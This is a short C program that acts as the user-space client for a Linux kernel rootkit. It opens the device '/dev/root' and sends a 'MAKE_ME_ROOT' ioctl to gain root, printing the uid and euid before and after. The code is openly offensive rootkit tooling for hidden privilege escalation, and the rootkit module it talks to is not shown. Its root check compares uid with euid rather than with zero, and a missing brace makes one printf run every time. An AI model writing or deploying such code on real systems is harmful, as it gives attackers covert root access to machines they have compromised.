/*
    * This file contains code that checks if a process is root, and if it is not,
     * it uses the rootkit's IOCTLs to become root.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#pragma message ("Compiling: "__FILE__)

#define CHAR_DEVICE_PATH "/dev/root"

/*IOCTL*/
#define ROOTKIT_MAGIC 'R'
#define MAKE_ME_ROOT_NO 0x01
#define MAKE_ME_ROOT _IO(ROOTKIT_MAGIC, MAKE_ME_ROOT_NO)

void checkRoot(void){
    int me = getuid();
    int myprivs = geteuid();

    if (me == myprivs)
    printf("Running as self (not root)\n");

    else
        printf("Running as somebody else (Im ROOT)\n");
        printf("uid %d euid %d \n",me,myprivs);
}


int main(){
    checkRoot();
    int fd;
    fd = open(CHAR_DEVICE_PATH, O_RDWR);
    if (fd < 0){
        printf("Error while opening the root\n");
        return 1;
    }
    /* ioctl to make me root */
    ioctl(fd, MAKE_ME_ROOT);
    close(fd);
    checkRoot();
    return 0;
}